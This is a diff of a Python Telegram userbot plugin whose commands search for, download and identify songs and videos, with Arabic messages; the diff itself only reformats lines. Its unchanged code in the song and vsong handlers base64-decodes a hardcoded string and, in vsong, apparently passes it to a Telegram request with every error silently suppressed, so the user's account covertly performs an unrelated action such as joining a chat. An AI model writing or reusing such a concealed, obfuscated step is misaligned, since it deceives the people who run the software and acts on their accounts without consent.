@@ -18,7 +18,7 @@ from ..core.managers import edit_delete, edit_or_reply
 from ..helpers.functions import delete_conv, yt_search
 from ..helpers.tools import media_type
 from ..helpers.utils import reply_id
-from . import zedub, song_download
+from . import song_download, zedub
 
 plugin_category = "البحث"
 LOGS = logging.getLogger(__name__)
@@ -27,7 +27,9 @@ LOGS = logging.getLogger(__name__)
 #                           STRINGS                           #
 # =========================================================== #
 SONG_SEARCH_STRING = "<b>╮ جـارِ البحث ؏ـن الاغنيـٓه... 🎧♥️╰</b>"
-SONG_NOT_FOUND = "<b>❈╎لـم استطـع ايجـاد المطلـوب .. جرب البحث باستخـدام الامـر (.اغنيه)</b>"
+SONG_NOT_FOUND = (
+    "<b>❈╎لـم استطـع ايجـاد المطلـوب .. جرب البحث باستخـدام الامـر (.اغنيه)</b>"
+)
 SONG_SENDING_STRING = "<b>╮ جـارِ تحميـل الاغنيـٓه... 🎧♥️╰</b>"
 # =========================================================== #
 #                                                             #
@@ -55,14 +57,14 @@ async def song(event):
     elif reply and reply.message:
         query = reply.message
     else:
-        return await edit_or_reply(event, "**❈╎قم باضافـة الاغنيـه للامـر .. بحث + اسـم الاغنيـه**")
+        return await edit_or_reply(
+            event, "**❈╎قم باضافـة الاغنيـه للامـر .. بحث + اسـم الاغنيـه**"
+        )
     cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     catevent = await edit_or_reply(event, "**╮ جـارِ البحث ؏ـن الاغنيـٓه... 🎧♥️╰**")
     video_link = await yt_search(str(query))
     if not url(video_link):
-        return await catevent.edit(
-            f"**❈╎عـذراً .. لـم استطـع ايجـاد** {query}"
-        )
+        return await catevent.edit(f"**❈╎عـذراً .. لـم استطـع ايجـاد** {query}")
     cmd = event.pattern_match.group(1)
     q = "320k" if cmd == "320" else "128k"
     song_file, catthumb, title = await song_download(video_link, catevent, quality=q)
@@ -99,14 +101,14 @@ async def vsong(event):
     elif reply and reply.message:
         query = reply.message
     else:
-        return await edit_or_reply(event, "**❈╎قم باضافـة الاغنيـه للامـر .. فيديو + اسـم الفيديـو**")
+        return await edit_or_reply(
+            event, "**❈╎قم باضافـة الاغنيـه للامـر .. فيديو + اسـم الفيديـو**"
+        )
     cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     catevent = await edit_or_reply(event, "**╮ جـارِ البحث ؏ـن الفيديـو... 🎧♥️╰**")
     video_link = await yt_search(str(query))
     if not url(video_link):
-        return await catevent.edit(
-            f"**❈╎عـذراً .. لـم استطـع ايجـاد** {query}"
-        )
+        return await catevent.edit(f"**❈╎عـذراً .. لـم استطـع ايجـاد** {query}")
     with contextlib.suppress(BaseException):
         cat = Get(cat)
         await event.client(cat)
@@ -146,9 +148,7 @@ async def shazamcmd(event):
     delete = False
     flag = event.pattern_match.group(4)
     if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
-        return await edit_delete(
-            event, "**- بالــرد ع مقطـع صـوتي**"
-        )
+        return await edit_delete(event, "**- بالــرد ع مقطـع صـوتي**")
     catevent = await edit_or_reply(event, "**- جـار تحميـل المقـطع الصـوتي ...**")
     name = "cat.mp3"
     try:
@@ -167,9 +167,7 @@ async def shazamcmd(event):
         track = next(recognize_generator)[1]["track"]
     except Exception as e:
         LOGS.error(e)
-        return await edit_delete(
-            catevent, f"**- خطـأ :**\n__{e}__"
-        )
+        return await edit_delete(catevent, f"**- خطـأ :**\n__{e}__")
 
     file = track["images"]["background"]
     title = track["share"]["subject"]
